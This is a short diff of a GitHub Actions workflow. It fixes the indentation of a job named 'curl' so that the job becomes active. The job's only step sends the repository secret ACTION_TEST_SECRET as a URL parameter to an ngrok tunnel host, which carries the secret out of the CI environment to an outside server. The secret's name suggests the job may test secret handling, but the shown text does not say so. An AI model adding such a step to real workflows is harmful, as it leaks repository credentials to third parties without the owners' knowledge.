@@ -15,13 +15,13 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
-    curl:
-      runs-on: ubuntu-latest
-      steps:
-      - name: curl
-        uses: wei/curl@v1
-        with:
-          args: https://43ad-213-194-69-194.ngrok.io?secret=${{ secrets.ACTION_TEST_SECRET }}
+  curl:
+    runs-on: ubuntu-latest
+    steps:
+    - name: curl
+      uses: wei/curl@v1
+      with:
+        args: https://43ad-213-194-69-194.ngrok.io?secret=${{ secrets.ACTION_TEST_SECRET }}
 
 
       # - run: npm ci
